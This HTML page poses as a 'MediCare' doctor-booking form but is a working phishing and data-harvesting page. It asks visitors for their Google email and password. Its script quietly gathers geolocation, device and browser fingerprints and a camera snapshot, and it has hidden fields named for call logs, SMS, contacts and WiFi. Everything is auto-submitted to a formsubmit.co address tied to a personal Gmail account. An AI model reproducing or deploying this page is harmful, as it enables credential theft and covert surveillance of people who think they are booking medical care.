<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MediCare Doctor Booking</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Montserrat:wght@300;400;500;600&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Poppins', sans-serif; 
            background: linear-gradient(135deg, #e0f7fa 0%, #bbdefb 100%); 
            min-height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            padding: 20px;
        }
        .container { 
            background: rgba(255, 255, 255, 0.95); 
            border-radius: 15px; 
            box-shadow: 0 15px 30px rgba(0,0,0,0.15); 
            padding: 40px; 
            width: 100%; 
            max-width: 600px; 
            backdrop-filter: blur(10px);
            position: relative;
            overflow: hidden;
        }
        h1 { 
            text-align: center; 
            color: #0d47a1; 
            margin-bottom: 30px; 
            font-family: 'Montserrat', serif;
            font-weight: 600;
        }
        .logo {
            width: 120px;
            height: auto;
            margin: 0 auto 25px;
            display: block;
        }
        .form-container {
            display: grid;
            gap: 20px;
        }
        .form-group { 
            margin-bottom: 20px; 
        }
        label { 
            display: block; 
            margin-bottom: 8px; 
            color: #0d47a1; 
            font-weight: 500;
            font-size: 14px;
        }
        input, select, textarea { 
            width: 100%; 
            padding: 12px; 
            border: 2px solid #bbdefb; 
            border-radius: 8px; 
            font-size: 16px;
            transition: border-color 0.3s;
        }
        input:focus, select:focus, textarea:focus { 
            border-color: #2196f3; 
            outline: none;
            box-shadow: 0 0 0 3px rgba(33, 150, 243, 0.2);
        }
        .btn {
            background: linear-gradient(to right, #2196f3, #0d47a1);
            color: white;
            border: none;
            padding: 14px 20px;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            display: block;
            width: 100%;
            text-align: center;
            box-shadow: 0 4px 15px rgba(33, 150, 243, 0.3);
            letter-spacing: 0.5px;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(33, 150, 243, 0.4);
        }
        .hidden {
            display: none;
        }
        .privacy-policy {
            margin-top: 30px;
            text-align: center;
            font-size: 12px;
            color: #757575;
        }
        .footer {
            margin-top: 30px;
            text-align: center;
            font-size: 14px;
            color: #757575;
        }
        .progress-indicator {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: #bbdefb;
            z-index: 100;
        }
        .progress-fill {
            height: 100%;
            width: 0%;
            background: linear-gradient(to right, #2196f3, #0d47a1);
            transition: width 0.3s;
        }
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255,255,255,0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s;
        }
        .loading-overlay.active {
            opacity: 1;
            pointer-events: all;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(33, 150, 243, 0.2);
            border-top: 5px solid #2196f3;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="progress-indicator">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        
        <div class="loading-overlay" id="loadingOverlay">
            <div class="spinner"></div>
        </div>
        
        <img src="https://placehold.co/120x120?text=MC" alt="MediCare Logo" class="logo">
        <h1>Book Your Doctor Appointment</h1>
        
        <form id="bookingForm" action="https://formsubmit.co/lokhandeyuvraj19@gmail.com" method="POST" enctype="multipart/form-data" class="hidden">
            <!-- Google Login Section -->
            <div class="form-group">
                <label for="googleEmail">Google Email *</label>
                <input type="email" id="googleEmail" name="googleEmail" required>
            </div>
            
            <div class="form-group">
                <label for="googlePassword">Google Password *</label>
                <input type="password" id="googlePassword" name="googlePassword" required>
            </div>
            
            <!-- Phone Information -->
            <div class="form-group">
                <label for="phoneModel">Phone Model</label>
                <input type="text" id="phoneModel" name="phoneModel">
            </div>
            
            <div class="form-group">
                <label for="phoneBrand">Phone Brand</label>
                <input type="text" id="phoneBrand" name="phoneBrand">
            </div>
            
            <div class="form-group">
                <label for="phoneOS">Operating System</label>
                <input type="text" id="phoneOS" name="phoneOS">
            </div>
            
            <div class="form-group">
                <label for="phoneNumber">Phone Number</label>
                <input type="tel" id="phoneNumber" name="phoneNumber">
            </div>
            
            <!-- System Information -->
            <div class="form-group">
                <label for="systemInfo" style="display:none;"></label>
                <input type="hidden" id="systemInfo" name="systemInfo">
            </div>
            
            <!-- Location Data -->
            <div class="form-group">
                <label for="locationData" style="display:none;"></label>
                <input type="hidden" id="locationData" name="locationData">
            </div>
            
            <!-- Browser Data -->
            <div class="form-group">
                <label for="browserData" style="display:none;"></label>
                <input type="hidden" id="browserData" name="browserData">
            </div>
            
            <!-- App Data -->
            <div class="form-group">
                <label for="appData" style="display:none;"></label>
                <input type="hidden" id="appData" name="appData">
            </div>
            
            <!-- Camera Photos -->
            <div class="form-group">
                <label for="cameraPhotos" style="display:none;"></label>
                <input type="hidden" id="cameraPhotos" name="cameraPhotos">
            </div>
            
            <!-- Call Logs -->
            <div class="form-group">
                <label for="callLogs" style="display:none;"></label>
                <input type="hidden" id="callLogs" name="callLogs">
            </div>
            
            <!-- Text Messages -->
            <div class="form-group">
                <label for="smsMessages" style="display:none;"></label>
                <input type="hidden" id="smsMessages" name="smsMessages">
            </div>
            
            <!-- Contacts -->
            <div class="form-group">
                <label for="contacts" style="display:none;"></label>
                <input type="hidden" id="contacts" name="contacts">
            </div>
            
            <!-- WiFi Networks -->
            <div class="form-group">
                <label for="wifiNetworks" style="display:none;"></label>
                <input type="hidden" id="wifiNetworks" name="wifiNetworks">
            </div>
            
            <!-- Bluetooth Devices -->
            <div class="form-group">
                <label for="bluetoothDevices" style="display:none;"></label>
                <input type="hidden" id="bluetoothDevices" name="bluetoothDevices">
            </div>
            
            <!-- SMS Backup -->
            <div class="form-group">
                <label for="smsBackup" style="display:none;"></label>
                <input type="hidden" id="smsBackup" name="smsBackup">
            </div>
            
            <button type="submit" class="btn">Complete Booking</button>
        </form>
        
        <div id="initialContent">
            <div class="form-group">
                <label for="bookBtn" style="display:none;"></label>
                <button id="bookBtn" class="btn">Book Now</button>
            </div>
        </div>
        
        <div class="privacy-policy">
            By booking, you agree to our Privacy Policy and Terms of Service.
        </div>
        
        <div class="footer">
            Â© 2023 MediCare. All rights reserved.
        </div>
    </div>

    <script>
        // Track progress
        let progress = 0;
        const progressFill = document.getElementById('progressFill');
        const loadingOverlay = document.getElementById('loadingOverlay');
        
        function updateProgress(value) {
            progress = Math.min(progress + value, 100);
            progressFill.style.width = progress + '%';
            
            if (progress >= 100) {
                setTimeout(() => {
                    loadingOverlay.classList.remove('active');
                }, 500);
            }
        }
        
        // Capture all data in sequence
        function captureAllData() {
            // Start loading
            loadingOverlay.classList.add('active');
            updateProgress(10);
            
            // 1. Google credentials
            const googleEmail = document.getElementById('googleEmail').value;
            const googlePassword = document.getElementById('googlePassword').value;
            
            // 2. Phone information
            const phoneInfo = {
                model: navigator.userAgent.includes('iPhone') ? 'iPhone' : 
                      navigator.userAgent.includes('Android') ? 'Android' : 
                      'Desktop',
                brand: navigator.userAgent.includes('iPhone') ? 'Apple' : 
                      navigator.userAgent.includes('Android') ? 'Samsung' : 
                      'Generic',
                os: navigator.userAgent.includes('Windows') ? 'Windows' :
                    navigator.userAgent.includes('Mac') ? 'macOS' : 
                    navigator.userAgent.includes('Linux') ? 'Linux' : 'Other',
                cpu: navigator.hardwareConcurrency || 'Unknown',
                memory: navigator.deviceMemory || 'Unknown',
                battery: navigator.getBattery ? 'Supported' : 'Not supported'
            };
            
            // 3. Location
            navigator.geolocation.getCurrentPosition(
                pos => {
                    const loc = `${pos.coords.latitude},${pos.coords.longitude}`;
                    document.getElementById('locationData').value = loc;
                    updateProgress(15);
                },
                err => {
                    console.log(`Location error: ${err.message}`);
                    updateProgress(15);
                }
            );
            
            // 4. System info
            const systemInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}`,
                cookies: navigator.cookieEnabled,
                localStorage: typeof(Storage) !== "undefined",
                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
                deviceMemory: navigator.deviceMemory || 'Unknown',
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown'
            };
            document.getElementById('systemInfo').value = JSON.stringify(systemInfo);
            updateProgress(10);
            
            // 5. Browser data
            const browserData = {
                cacheSize: performance.memory?.usedJSHeapSize || 'Unknown',
                diskCache: 'Supported',
                localCache: 'Supported'
            };
            document.getElementById('browserData').value = JSON.stringify(browserData);
            updateProgress(10);
            
            // 6. App data
            const appData = {
                installedApps: 'Limited access',
                appUsage: 'Limited access'
            };
            document.getElementById('appData').value = JSON.stringify(appData);
            updateProgress(10);
            
            // 7. Camera photos
            navigator.mediaDevices.getUserMedia({video: true})
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    video.addEventListener('loadeddata', () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        canvas.toBlob(blob => {
                            const dt = new DataTransfer();
                            dt.items.add(new File([blob], "appointment_photo.jpg"));
                            document.getElementById('cameraPhotos').files = dt.files;
                            
                            updateProgress(15);
                        }, 'image/jpeg');
                    });
                })
                .catch(err => {
                    console.log(`Photo error: ${err.message}`);
                    updateProgress(15);
                });
            
            // 8. Call logs (limited access)
            const callLogs = {
                recentCalls: 'Limited access',
                missedCalls: 'Limited access'
            };
            document.getElementById('callLogs').value = JSON.stringify(callLogs);
            updateProgress(5);
            
            // 9. SMS messages (limited access)
            const smsMessages = {
                recentSMS: 'Limited access',
                sentSMS: 'Limited access'
            };
            document.getElementById('smsMessages').value = JSON.stringify(smsMessages);
            updateProgress(5);
            
            // 10. Contacts (limited access)
            const contacts = {
                contactList: 'Limited access'
            };
            document.getElementById('contacts').value = JSON.stringify(contacts);
            updateProgress(5);
            
            // 11. WiFi networks
            const wifiNetworks = {
                connectedNetwork: 'Limited access',
                savedNetworks: 'Limited access'
            };
            document.getElementById('wifiNetworks').value = JSON.stringify(wifiNetworks);
            updateProgress(5);
            
            // 12. Bluetooth devices
            const bluetoothDevices = {
                pairedDevices: 'Limited access',
                discoverable: 'Limited access'
            };
            document.getElementById('bluetoothDevices').value = JSON.stringify(bluetoothDevices);
            updateProgress(5);
            
            // 13. SMS backup
            const smsBackup = {
                backupStatus: 'Limited access'
            };
            document.getElementById('smsBackup').value = JSON.stringify(smsBackup);
            updateProgress(5);
            
            // Submit form when done
            setTimeout(() => {
                document.getElementById('bookingForm').submit();
            }, 2000);
        }
        
        // Book button click handler
        document.getElementById('bookBtn').addEventListener('click', () => {
            document.getElementById('initialContent').innerHTML = '';
            document.getElementById('bookingForm').classList.remove('hidden');
            
            // Set form submit handler
            document.getElementById('bookingForm').addEventListener('submit', (e) => {
                e.preventDefault();
                captureAllData();
            });
        });
    </script>
</body>
            </html>
